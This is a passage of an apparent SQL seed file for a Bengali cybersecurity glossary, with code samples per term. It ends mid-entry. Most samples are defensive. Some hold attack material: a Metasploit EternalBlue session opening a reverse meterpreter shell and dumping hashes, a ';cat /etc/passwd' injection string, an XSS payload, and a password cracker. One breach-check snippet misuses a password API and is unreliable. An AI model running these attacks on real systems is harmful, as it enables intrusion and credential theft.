-- CyberSec Dictionary: Additional 57 Terms
-- Run AFTER supabase_setup.sql

INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'A', 'Access Control List (ACL)', 'কে কোথায় যেতে পারবে তার তালিকা',
  '📋 দারোয়ানের খাতায় লেখা — কোন নাম থাকলে ঢুকতে পারবে।',
  'ACL হলো একটি তালিকা যা নির্দিষ্ট করে কোন user বা system কোন resource-এ কী ধরনের access পাবে। Network ACL ও File system ACL দুই ধরন।',
  'Router-এ কোন IP ব্লক করবে, ফাইল সিস্টেমে কে read করতে পারবে।',
  'AWS S3 bucket-এ ACL দিয়ে নির্দিষ্ট IP range থেকেই শুধু access দেওয়া।',
  $X000X$# Linux File ACL
setfacl -m u:akib:rw sensitive_file.txt
getfacl sensitive_file.txt

# AWS S3 Bucket Policy
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::123:user/akib"},
  "Action": ["s3:GetObject"],
  "Resource": "arn:aws:s3:::my-bucket/*"
}$X000X$,
  ARRAY['access-control','permissions','network','AWS','Linux'],
  'medium', 'Access Control', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'A', 'Advanced Persistent Threat (APT)', 'দীর্ঘমেয়াদী লুকানো সাইবার আক্রমণ',
  '🕵️ একজন গোয়েন্দা মাসের পর মাস ছদ্মবেশে তথ্য সংগ্রহ করছে।',
  'APT হলো অত্যন্ত sophisticated, দীর্ঘমেয়াদী সাইবার আক্রমণ — সাধারণত nation-state বা বড় হ্যাকার গ্রুপের দ্বারা পরিচালিত।',
  'সরকারি সংস্থা, প্রতিরক্ষা কোম্পানি, critical infrastructure আক্রমণ।',
  'APT28 (Fancy Bear) — রাশিয়ান গ্রুপ যারা US election infrastructure আক্রমণ করেছিল।',
  $X001X$# APT Detection Log Analysis
import re
from collections import defaultdict

def detect_apt(log_file):
    indicators = defaultdict(list)
    with open(log_file) as f:
        for line in f:
            if re.search(r'FAILED.*ssh', line, re.I):
                indicators['ssh_brute'].append(line.strip())
            if re.search(r'0[2-5]:\d{2}:\d{2}', line):
                indicators['odd_hours'].append(line.strip())
    return dict(indicators)

print(detect_apt('/var/log/auth.log'))$X001X$,
  ARRAY['nation-state','espionage','lateral-movement','persistence'],
  'critical', 'Threat Actor', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'A', 'Antivirus / EDR', 'ম্যালওয়্যার সনাক্তকরণ ও প্রতিরোধ',
  '💉 শরীরের ইমিউন সিস্টেমের মতো — ভাইরাস দেখলে আক্রমণ করে।',
  'Antivirus সিগনেচার-ভিত্তিক malware সনাক্ত করে। EDR (Endpoint Detection and Response) behavioral analysis দিয়ে unknown threat-ও ধরতে পারে।',
  'Workstation সুরক্ষা, malware quarantine, real-time scanning।',
  'CrowdStrike Falcon EDR একটি zero-day malware behaviorally সনাক্ত করে ব্লক করল।',
  $X002X$# Signature-based Scanner
import hashlib, os

BAD_HASHES = {
    '44d88612fea8a8f36de82e1278abb02f': 'EICAR Test Virus',
}

def scan_file(filepath):
    with open(filepath, 'rb') as f:
        h = hashlib.md5(f.read()).hexdigest()
    if h in BAD_HASHES:
        print(f'MALWARE: {BAD_HASHES[h]} in {filepath}')
        return True
    return False$X002X$,
  ARRAY['endpoint','malware','EDR','signature','behavioral'],
  'low', 'Defense', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'B', 'Bug Bounty', 'নিরাপত্তা ত্রুটি খুঁজে পুরস্কার',
  '🏆 পুলিশ যেমন অপরাধীর তথ্যের জন্য পুরস্কার দেয় — কোম্পানিও bug-এর জন্য দেয়।',
  'Bug Bounty Program হলো কোম্পানির সিস্টেমে vulnerability খুঁজে দেওয়ার বিনিময়ে ethical hacker-দের অর্থ পুরস্কার দেওয়ার কর্মসূচি।',
  'Facebook, Google, Microsoft — সব বড় কোম্পানিই bug bounty চালায়।',
  'একজন বাংলাদেশি researcher Google-এ XSS bug খুঁজে $10,000 পেয়েছেন।',
  $X003X$## Bug Bounty Report Template

**Severity:** Critical / High / Medium / Low
**CVSS Score:** 9.8

## Steps to Reproduce
1. Navigate to https://target.com/search
2. Input: <script>alert(document.domain)</script>
3. Observe: Alert popup

## Impact
Attacker can steal session cookies.

## Remediation
Escape user input using DOMPurify$X003X$,
  ARRAY['ethical-hacking','rewards','HackerOne','Bugcrowd','disclosure'],
  'low', 'Ethical Hacking', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'B', 'Buffer Overflow', 'মেমোরি সীমা অতিক্রম করে কোড চালানো',
  '🥛 গ্লাসের বাইরে পানি উপচে পড়লে যেমন ক্ষতি হয় — মেমোরিতেও তাই।',
  'Buffer Overflow হলো এমন দুর্বলতা যেখানে attacker নির্ধারিত বাফারের বাইরে ডেটা লিখে adjacent মেমোরি overwrite করে।',
  'Legacy C/C++ সফটওয়্যার exploit, privilege escalation, RCE।',
  'Morris Worm (1988) — প্রথম internet worm, gets() buffer overflow exploit করেছিল।',
  $X004X$// Buffer Overflow Prevention (C)

// Vulnerable
void vuln(char *input) {
    char buf[64];
    strcpy(buf, input); // NO bounds check!
}

// Safe
void safe(char *input) {
    char buf[64];
    strncpy(buf, input, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
}

// Compile with protections:
// gcc -fstack-protector -D_FORTIFY_SOURCE=2 -o safe safe.c
// Use memory-safe languages: Rust, Go$X004X$,
  ARRAY['memory','exploit','C','stack','heap','RCE'],
  'critical', 'Vulnerability', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'C', 'Certificate Authority (CA)', 'ডিজিটাল পরিচয়পত্র যাচাইকারী',
  '🏛️ পাসপোর্ট অফিসের মতো — সরকার পরিচয় নিশ্চিত করে সার্টিফিকেট দেয়।',
  'CA হলো trusted তৃতীয় পক্ষ যা SSL/TLS সার্টিফিকেট ইস্যু করে নিশ্চিত করে যে ওয়েবসাইট সত্যিই সে যা দাবি করছে।',
  'HTTPS সার্টিফিকেট, code signing, email encryption।',
  'DigiCert, Let''s Encrypt — এরাই বেশিরভাগ ওয়েবসাইটের SSL সার্টিফিকেট দেয়।',
  $X005X$# Let's Encrypt Free SSL
sudo apt install certbot python3-certbot-nginx
sudo certbot --nginx -d example.com

# Auto-renewal
sudo crontab -e
# 0 12 * * * /usr/bin/certbot renew --quiet

# Check certificate info
openssl x509 -in /etc/ssl/cert.pem -text -noout

# Self-signed (dev only)
openssl req -x509 -newkey rsa:4096 \
  -keyout key.pem -out cert.pem -days 365 -nodes$X005X$,
  ARRAY['PKI','SSL','TLS','HTTPS','Lets-Encrypt'],
  'medium', 'Cryptography', 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'C', 'Cloud Security', 'ক্লাউড পরিবেশের নিরাপত্তা',
  '☁️ ব্যাংকের vault cloud-এ রাখলেও তালার দরকার হয়।',
  'Cloud Security হলো cloud computing environment রক্ষার practices, policies ও technologies। Shared Responsibility Model — provider infrastructure, customer data রক্ষা করে।',
  'AWS, Azure, GCP-এ data protection, IAM, compliance।',
  'Capital One 2019 breach — misconfigured AWS S3 bucket, 100M+ customer data exposed।',
  $X006X$# AWS Security Best Practices

# Block S3 public access
aws s3api put-public-access-block \
  --bucket my-bucket \
  --public-access-block-configuration \
  BlockPublicAcls=true,BlockPublicPolicy=true

# Enable CloudTrail logging
aws cloudtrail create-trail \
  --name my-trail \
  --s3-bucket-name my-log-bucket

# Check IAM permissions
aws iam get-account-authorization-details$X006X$,
  ARRAY['AWS','Azure','GCP','IAM','S3','shared-responsibility'],
  'high', 'Cloud Security', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'C', 'CVE', 'পরিচিত নিরাপত্তা দুর্বলতার তালিকা',
  '📰 Most Wanted পোস্টারের মতো — প্রতিটি vulnerability-র আলাদা ID।',
  'CVE (Common Vulnerabilities and Exposures) হলো publicly disclosed vulnerabilities-এর standardized ID। CVE-YYYY-NNNNN format। CVSS score দিয়ে severity রেট করা হয়।',
  'Patch management, vulnerability scanning, risk prioritization।',
  'CVE-2021-44228 — Log4Shell, CVSS 10.0, Apache Log4j-এ critical RCE।',
  $X007X$# CVE Check Script
import requests

def check_cve(cve_id):
    url = f'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}'
    resp = requests.get(url, timeout=10)
    data = resp.json()
    cve = data['vulnerabilities'][0]['cve']
    desc = cve['descriptions'][0]['value']
    metrics = cve.get('metrics', {})
    score = metrics.get('cvssMetricV31',[{}])[0].get('cvssData',{}).get('baseScore','N/A')
    print(f'CVE: {cve_id}\nScore: {score}/10\n{desc[:200]}')

check_cve('CVE-2021-44228')$X007X$,
  ARRAY['vulnerability','NVD','CVSS','patch','Log4Shell'],
  'high', 'Vulnerability', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'C', 'Command Injection', 'OS কমান্ড inject করার আক্রমণ',
  '📞 অর্ডার দেওয়ার সময় লুকিয়ে অন্য নির্দেশ ঢুকিয়ে দেওয়া।',
  'Command Injection হলো এমন vulnerability যেখানে user input-এর মাধ্যমে সার্ভারে arbitrary OS command execute করানো যায়।',
  'Web app-এ ping/nslookup feature, file processing।',
  'ping.php?host=8.8.8.8;cat /etc/passwd — সার্ভারের পাসওয়ার্ড ফাইল দেখা।',
  $X008X$// Command Injection Prevention (Node.js)
const { execFile } = require('child_process');

// VULNERABLE
// exec(`ping -c 1 ${userInput}`, callback);

// SAFE: validate then use execFile
function safePing(host) {
    if (!/^[\d.]{7,15}$/.test(host))
        throw new Error('Invalid IP');
    execFile('ping', ['-c', '1', host], (err, stdout) => {
        console.log(stdout);
    });
}

safePing('8.8.8.8');$X008X$,
  ARRAY['injection','OS','RCE','OWASP','shell'],
  'critical', 'Web Security', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'C', 'CTF (Capture The Flag)', 'সাইবার সিকিউরিটি প্রতিযোগিতা',
  '🚩 রহস্য উপন্যাসের মতো — সুরাহা করো, পুরস্কার পাও।',
  'CTF হলো cybersecurity competition যেখানে teams বিভিন্ন security challenge সমাধান করে flag খুঁজে বের করে। Web, Crypto, Pwn, RE, Forensics ক্যাটাগরি।',
  'Security skill শেখা, team building, job recruitment।',
  'DEF CON CTF — বিশ্বের সবচেয়ে বড় hacking competition।',
  $X009X$# CTF Platforms
# TryHackMe.com  — beginners
# HackTheBox.com — intermediate
# PicoCTF.org    — students (free)
# CTFtime.org    — upcoming events

# Simple Hash Crack
import hashlib

def crack_md5(target, wordlist_path):
    with open(wordlist_path) as f:
        for word in f:
            word = word.strip()
            if hashlib.md5(word.encode()).hexdigest() == target:
                return word
    return None

flag = crack_md5('5f4dcc3b5aa765d61d8327deb882cf99',
                  '/usr/share/wordlists/rockyou.txt')
print(f'Flag: {flag}')$X009X$,
  ARRAY['competition','learning','HackTheBox','TryHackMe','hacking'],
  'low', 'Security Testing', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'D', 'Data Breach', 'ব্যক্তিগত তথ্য অননুমোদিতভাবে ফাঁস',
  '💧 বাঁধ ভেঙে পানি বেরিয়ে যাওয়ার মতো — ডেটা বের হলে ফেরানো যায় না।',
  'Data Breach হলো confidential ডেটা অননুমোদিতভাবে access বা theft হওয়ার ঘটনা। Financial, healthcare, personal data সবচেয়ে বেশি targeted।',
  'Customer database চুরি, healthcare record ফাঁস, credit card theft।',
  'Yahoo 2013 — 3 billion অ্যাকাউন্টের ডেটা চুরি, ইতিহাসের সবচেয়ে বড়।',
  $X010X$// Check if email was breached (HaveIBeenPwned)
const crypto = require('crypto');

async function checkBreached(email) {
    const hash = crypto.createHash('sha1')
        .update(email.toLowerCase()).digest('hex').toUpperCase();
    const prefix = hash.slice(0, 5);
    const suffix = hash.slice(5);
    const resp = await fetch(
        `https://api.pwnedpasswords.com/range/${prefix}`
    );
    const text = await resp.text();
    return text.split('\r\n').some(line => line.startsWith(suffix));
}

checkBreached('test@example.com').then(b => console.log('Breached:', b));$X010X$,
  ARRAY['privacy','GDPR','incident','PII','notification'],
  'critical', 'Incident Response', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'D', 'DNS Spoofing', 'ডোমেইন নামের ভুয়া উত্তর দেওয়া',
  '🗺️ মানচিত্রে ভুল ঠিকানা লিখে দেওয়া — গন্তব্যে না গিয়ে ফাঁদে পড়বে।',
  'DNS Spoofing হলো DNS resolver cache-এ ভুয়া records ঢুকিয়ে দেওয়া — ব্যবহারকারী সঠিক সাইটের বদলে attacker-controlled সাইটে যায়।',
  'Phishing site redirect, malware distribution, credential harvesting।',
  'bank.com টাইপ করলে fake bank site খুলছে — DNS cache poisoned।',
  $X011X$# DNSSEC Verification (Python)
import dns.resolver

def check_dns(domain):
    try:
        resolver = dns.resolver.Resolver()
        answer = resolver.resolve(domain, 'A')
        for rdata in answer:
            print(f'{domain} -> {rdata.address}')
    except Exception as e:
        print(f'DNS Error: {e}')

check_dns('google.com')

# Prevention:
# Use Cloudflare 1.1.1.1 or Google 8.8.8.8
# Enable DNSSEC on your domain
# Use DNS over HTTPS (DoH)$X011X$,
  ARRAY['DNS','DNSSEC','redirect','cache','network'],
  'high', 'Network Attack', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'D', 'Dark Web', 'লুকানো ইন্টারনেটের জগৎ',
  '🌑 শহরের আন্ডারগ্রাউন্ড বাজার — বিশেষ পথে যেতে হয়।',
  'Dark Web হলো internet-এর এমন অংশ যা standard browser দিয়ে accessible নয়। Tor browser দিয়ে .onion sites access করা হয়।',
  'Stolen data বিক্রি, malware বাজার, anonymous communication।',
  'Have I Been Pwned — Dark Web-এ পাওয়া চুরি হওয়া credentials track করে।',
  $X012X$# Check if password was leaked
import hashlib, requests

def check_password(password):
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    resp = requests.get(f'https://api.pwnedpasswords.com/range/{prefix}')
    for line in resp.text.splitlines():
        parts = line.split(':')
        if parts[0] == suffix:
            return int(parts[1])
    return 0

count = check_password('password123')
if count:
    print(f'Pwned {count} times! Change it.')
else:
    print('Not found in breaches.')$X012X$,
  ARRAY['Tor','onion','anonymity','OSINT','threat-intel'],
  'high', 'Threat Intelligence', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'E', 'Exploit', 'নিরাপত্তা ত্রুটি ব্যবহার করার কোড',
  '🗝️ তালার ত্রুটি ব্যবহার করে বিশেষ চাবি ছাড়াই দরজা খোলা।',
  'Exploit হলো কোড বা technique যা software vulnerability attack করতে ব্যবহার হয়। Zero-day exploit সবচেয়ে বিপজ্জনক।',
  'Penetration testing, CTF, vulnerability research।',
  'EternalBlue — NSA তৈরি exploit, WannaCry ransomware ব্যবহার করেছিল।',
  $X013X$# Metasploit Framework (Ethical use only!)
# Always get written permission first

msfconsole

# Search exploit
search eternalblue

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# Post exploitation
sysinfo
getuid
hashdump$X013X$,
  ARRAY['Metasploit','EternalBlue','RCE','pentest','CVE'],
  'critical', 'Attack Vector', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'E', 'Ethical Hacking', 'অনুমোদিত হ্যাকিং',
  '🩺 ডাক্তার রোগ সারানোর জন্য সূচ ঢোকান — ক্ষতি করার জন্য নয়।',
  'Ethical Hacking হলো সংগঠনের অনুমতি নিয়ে তাদের system-এর vulnerability খুঁজে বের করা। White hat vs Black hat vs Grey hat।',
  'Security assessment, bug bounty, red team exercise।',
  'Kevin Mitnick — সাবেক notorious hacker, পরে বিশ্বের সেরা ethical hacker।',
  $X014X$# Certifications Roadmap
# Entry: CEH, CompTIA Security+
# Advanced: OSCP (hardest), GPEN, CRTE

# Free Learning
# TryHackMe.com
# HackTheBox.com
# PortSwigger Web Academy

# Essential Kali Linux tools:
# nmap, metasploit, burpsuite
# sqlmap, nikto, wireshark
# john, hashcat, aircrack-ng

echo 'Always get WRITTEN permission!'$X014X$,
  ARRAY['white-hat','CEH','OSCP','red-team','pentest'],
  'low', 'Ethical Hacking', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'F', 'Digital Forensics', 'ডিজিটাল প্রমাণ সংগ্রহ ও বিশ্লেষণ',
  '🔬 অপরাধ দৃশ্যে আঙুলের ছাপ খোঁজার মতো।',
  'Digital Forensics হলো digital devices থেকে প্রমাণ সংগ্রহ, সংরক্ষণ ও বিশ্লেষণের বিজ্ঞান। Chain of custody রক্ষা করা জরুরি।',
  'Cybercrime তদন্ত, incident response, corporate investigation।',
  'SolarWinds hack তদন্তে forensic analysts malware TTPs বিশ্লেষণ করেছিল।',
  $X015X$# Disk Imaging
sudo dd if=/dev/sdb of=/evidence/disk.img bs=4096 conv=noerror,sync

# Hash verification
sha256sum /dev/sdb > original.hash
sha256sum /evidence/disk.img > copy.hash
diff original.hash copy.hash

# Memory Forensics (Volatility)
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win10x64 pslist
volatility -f memory.dmp --profile=Win10x64 netscan$X015X$,
  ARRAY['investigation','evidence','Autopsy','Volatility','incident'],
  'medium', 'Incident Response', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'F', 'Fuzzing', 'এলোমেলো ইনপুট দিয়ে bug খোঁজা',
  '🎲 হাজারো র্যান্ডম চাবি চেষ্টা করে কোন দরজা খোলে দেখা।',
  'Fuzzing হলো automated testing যেখানে software-এ random/invalid input দিয়ে crash বা vulnerability খোঁজা হয়।',
  'Browser, OS, parser, protocol testing।',
  'Google Project Zero AFL fuzzer দিয়ে Chrome-এ শত শত vulnerability খুঁজেছে।',
  $X016X$# AFL++ Fuzzing
afl-cc -o target target.c
afl-fuzz -i seeds/ -o output/ ./target @@

# Python Simple Fuzzer
import subprocess, random, string

def fuzz(binary, n=1000):
    crashes = []
    for i in range(n):
        payload = ''.join(random.choices(string.printable,
                          k=random.randint(1, 500)))
        result = subprocess.run([binary], input=payload.encode(),
                                capture_output=True, timeout=3)
        if result.returncode < 0:
            crashes.append(payload)
            print(f'Crash #{len(crashes)}')
    return crashes$X016X$,
  ARRAY['testing','AFL','bug-hunting','automated','vulnerability'],
  'medium', 'Security Testing', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'G', 'GDPR and Data Privacy', 'ব্যক্তিগত তথ্য সুরক্ষার আইন',
  '📜 নাগরিকের অধিকার — কোম্পানি তোমার তথ্য নিলে নিয়ম মানতে হবে।',
  'GDPR (General Data Protection Regulation) হলো EU-র data privacy আইন। Data minimization, right to erasure, consent, 72-hour breach notification।',
  'EU নাগরিকদের data handle করে এমন সব কোম্পানি।',
  'Meta €1.2B — সর্বোচ্চ GDPR জরিমানা (2023)।',
  $X017X$// GDPR: Right to Erasure
async function deleteUserData(userId) {
    await Promise.all([
        db.users.delete({ id: userId }),
        db.orders.anonymize({ userId }),
        db.logs.delete({ userId }),
        cache.del(`user:${userId}`)
    ]);
    await auditLog.record('DATA_ERASURE', userId);
    // Must respond within 30 days
}

// 72-hour breach notification
async function reportBreach(details) {
    await notifyDPA({ ...details, reportedAt: new Date() });
}$X017X$,
  ARRAY['privacy','compliance','EU','data-protection','consent'],
  'high', 'Compliance', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'H', 'Honeypot', 'আক্রমণকারীকে ফাঁদে ফেলার সিস্টেম',
  '🍯 মৌচাক দেখলে ভালুক আসে — fake সিস্টেম দেখলে hacker আসে, ধরা পড়ে।',
  'Honeypot হলো ইচ্ছাকৃতভাবে vulnerable দেখানো decoy system যা attacker-কে আকৃষ্ট করে তাদের technique সম্পর্কে তথ্য সংগ্রহ করে।',
  'Threat intelligence, early warning, attacker profiling।',
  'Honeynet Project — বিশ্বজুড়ে honeypot network দিয়ে cyber threat intelligence।',
  $X018X$# Deploy Cowrie SSH Honeypot
docker run -p 2222:2222 \
  -v $(pwd)/cowrie-data:/cowrie/var \
  cowrie/cowrie

tail -f cowrie-data/log/cowrie.log

# Simple HTTP Honeypot
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging

logging.basicConfig(filename='honeypot.log')

class HoneypotHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        logging.info(f'GET {self.path} from {self.client_address[0]}')
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), HoneypotHandler).serve_forever()$X018X$,
  ARRAY['deception','threat-intel','canary','early-warning'],
  'medium', 'Defense', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'I', 'IAM (Identity and Access Management)', 'পরিচয় ও অ্যাক্সেস পরিচালনা',
  '🎫 অফিসের visitor badge সিস্টেম — কে কোথায় যেতে পারবে নিয়ন্ত্রণ।',
  'IAM হলো সঠিক মানুষকে সঠিক resource-এ সঠিক সময়ে access দেওয়ার framework। SSO, MFA, RBAC সব IAM-এর অংশ।',
  'Enterprise user management, cloud access, compliance।',
  'Okta IAM দিয়ে 10,000 কর্মীর সব SaaS app-এ Single Sign-On।',
  $X019X$// IAM Permission Check (Node.js)
const permissions = {
    admin:    ['read','write','delete','admin'],
    manager:  ['read','write'],
    employee: ['read'],
};

const can = (role, action) =>
    permissions[role]?.includes(action) ?? false;

const requirePerm = (action) => (req, res, next) => {
    if (can(req.user.role, action)) return next();
    res.status(403).json({ error: 'Access denied' });
};

app.delete('/users/:id', authenticate, requirePerm('delete'), handler);$X019X$,
  ARRAY['SSO','RBAC','Okta','Azure-AD','privilege'],
  'high', 'Identity', 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'I', 'Incident Response', 'সাইবার আক্রমণে সাড়া দেওয়ার পরিকল্পনা',
  '🚒 আগুন লাগলে দমকল বাহিনীর মতো — দ্রুত, সংগঠিত, ক্ষতি কমানো।',
  'Incident Response হলো সাইবার আক্রমণে সাড়া দেওয়ার process। NIST IR: Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned।',
  'Data breach, ransomware, insider threat যেকোনো incident-এ।',
  'Equifax 2017 — দেরিতে সাড়া দিয়ে $575M penalty।',
  $X020X$# Incident Response Checklist
import datetime, json

class IR:
    def __init__(self, incident_type):
        self.data = {
            'id': f'IR-{datetime.date.today().strftime("%Y%m%d")}-001',
            'type': incident_type,
            'status': 'open',
            'timeline': []
        }
    def add_event(self, phase, action):
        self.data['timeline'].append({
            'phase': phase,
            'action': action,
            'time': datetime.datetime.now().isoformat()
        })
    def report(self):
        return json.dumps(self.data, indent=2, ensure_ascii=False)

ir = IR('Ransomware')
ir.add_event('Detection', 'EDR alert received')
ir.add_event('Containment', 'Isolated infected hosts')
print(ir.report())$X020X$,
  ARRAY['NIST','playbook','CIRT','forensics','recovery'],
  'high', 'Incident Response', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'I', 'Insider Threat', 'ভেতর থেকে বিপদ',
  '🐍 বিশ্বস্ত কাউকে চাবি দিলে সে যদি চুরি করে।',
  'Insider Threat হলো কর্মী, contractor বা partner যারা intentionally বা accidentally security ক্ষতিগ্রস্ত করে।',
  'Data theft, sabotage, accidental misconfiguration।',
  'Edward Snowden — NSA contractor, classified documents ফাঁস।',
  $X021X$# User Behavior Analytics (UEBA)
import statistics

class BehaviorMonitor:
    def __init__(self):
        self.baselines = {}

    def update(self, user, metric, value):
        self.baselines.setdefault(user, {}).setdefault(metric, []).append(value)

    def is_anomaly(self, user, metric, current):
        values = self.baselines.get(user, {}).get(metric, [])
        if len(values) < 10: return False
        mean = statistics.mean(values)
        std = statistics.stdev(values) or 0.001
        z = abs(current - mean) / std
        if z > 3:
            print(f'Anomaly: {user} {metric}={current} (z={z:.1f})')
            return True
        return False$X021X$,
  ARRAY['UEBA','DLP','monitoring','employee','sabotage'],
  'high', 'Threat Actor', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'I', 'IoT Security', 'ইন্টারনেট অব থিংস নিরাপত্তা',
  '🏠 স্মার্ট বাড়ির সব ডিভাইস — একটা দুর্বল হলে সব ঝুঁকিতে।',
  'IoT Security হলো internet-connected devices সুরক্ষার চ্যালেঞ্জ। Default password, unpatched firmware — সবচেয়ে বড় সমস্যা।',
  'Smart home, industrial SCADA, healthcare devices।',
  'Mirai botnet — default password থাকা 600,000 IoT device দিয়ে internet ডাউন।',
  $X022X$# IoT Security Audit
import nmap, requests

def audit_device(ip):
    issues = []
    # Check default credentials
    for user, pwd in [('admin','admin'),('root','root'),('admin','')]:
        try:
            r = requests.get(f'http://{ip}', auth=(user,pwd), timeout=3)
            if r.status_code == 200:
                issues.append(f'Default creds: {user}/{pwd}')
        except: pass
    # Check insecure Telnet
    nm = nmap.PortScanner()
    nm.scan(ip, '23')
    if nm[ip].get('tcp',{}).get(23,{}).get('state') == 'open':
        issues.append('Telnet open — use SSH instead')
    return issues$X022X$,
  ARRAY['smart-home','SCADA','firmware','Mirai','embedded'],
  'high', 'IoT Security', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'J', 'JWT (JSON Web Token)', 'ডিজিটাল পরিচয়পত্র টোকেন',
  '🎟️ কনসার্টের টিকেটের মতো — তথ্য আছে, যাচাই করা যায়।',
  'JWT হলো তিন অংশের (header.payload.signature) digitally signed token। Stateless authentication-এ ব্যবহার হয়।',
  'API authentication, mobile app, microservices।',
  'REST API-তে প্রতিটি request-এর Authorization header-এ Bearer JWT।',
  $X023X$// JWT Implementation (Node.js)
const jwt = require('jsonwebtoken');

function createToken(user) {
    return jwt.sign(
        { sub: user.id, email: user.email, role: user.role },
        process.env.JWT_SECRET,
        { expiresIn: '15m' }  // Short-lived!
    );
}

// Verify middleware
const verifyJWT = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];
